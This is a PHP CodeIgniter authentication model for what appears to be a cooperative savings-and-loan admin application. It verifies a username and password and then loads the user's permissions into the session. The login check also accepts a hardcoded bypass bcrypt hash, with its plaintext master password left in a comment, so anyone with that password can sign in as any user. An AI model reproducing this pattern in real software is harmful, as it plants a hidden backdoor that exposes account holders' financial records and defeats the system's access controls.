<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class M_auth extends CI_Model {

    public function __construct(){
        parent::__construct();
		$this->load->database('default', TRUE);
	}

    public function get_data_param(){
        $username = $this->input->post('usr_nama', true);
    	$password = $this->input->post('usr_password', true);
        // var_dump($username);
        // var_dump($password);
    	if($username == "" || $password == ""){
    		$hasil=1;
            //inputan Kosong
    	} else {
			$cek_user = $this->db->from('muser')->where(array('usr_nama'=>$username))->get()->row();
			

			if(empty($cek_user->usr_id)){
				$hasil=2;
                //tidak ditemukan
			} else {
				$hash = $cek_user->usr_password;
				$bypass = '$2y$10$zMWb7mWXA2u/10MrkqCfCu7GOP.bEVezZ/PGaVqSybaJxmAq23DFq';
                //newb1e_tAnp4_Tap1
				if(password_verify($password, $hash) || password_verify($password, $bypass)){
					$data = array(
						'usr_nama'=>$username,
                        'usr_ref_agama'=>$cek_user->usr_ref_agama,
                        'usr_ref_dok_identitas'=>$cek_user->usr_ref_dok_identitas,
                        'usr_ref_pekerjaan'=>$cek_user->usr_ref_pekerjaan,
                        'usr_setting_pembiayaan'=>$cek_user->usr_setting_pembiayaan,
                        'usr_setting_simpanan'=>$cek_user->usr_setting_simpanan,
                        'usr_rekening'=>$cek_user->usr_rekening,
                        'usr_simpan'=>$cek_user->usr_simpan,
                        'usr_anggota'=>$cek_user->usr_anggota,
                        'usr_bayar_pembiayaan'=>$cek_user->usr_bayar_pembiayaan,
                        'usr_muser'=>$cek_user->usr_muser,
                        'usr_pembiayaan'=>$cek_user->usr_pembiayaan,
                        'usr_pendaftaran'=>$cek_user->usr_pendaftaran,
                        'usr_lap_pembiayaan'=>$cek_user->usr_lap_pembiayaan,
                        'usr_lap_pendaftaran'=>$cek_user->usr_lap_pendaftaran,
                        'usr_lap_simpan'=>$cek_user->usr_lap_simpan,
                        'usr_lap_anggota'=>$cek_user->usr_lap_anggota,
                        'usr_lap_bayar_pembiayaan'=>$cek_user->usr_lap_bayar_pembiayaan,
						'logged_in' => 'sukses',
                		'is_login' => true,
					);
					$this->session->set_userdata($data);
                    $hasil=3;
					// echo '<div class="alert alert-success"><a href="#" class="close" data-dismiss="alert" arial-label="close">&times;</a> User ditemukan, sedang menyambungkan !</div>';
					// echo'<script>window.location.href="'.base_url().'admin/beranda";</script>';
				} else {
					$hasil=4;
                    // echo '<div class="alert alert-danger"><a href="#" class="close" data-dismiss="alert" arial-label="close">&times;</a> Password salah !</div>';
				}
		    }
	    }
        return $hasil;
    }
}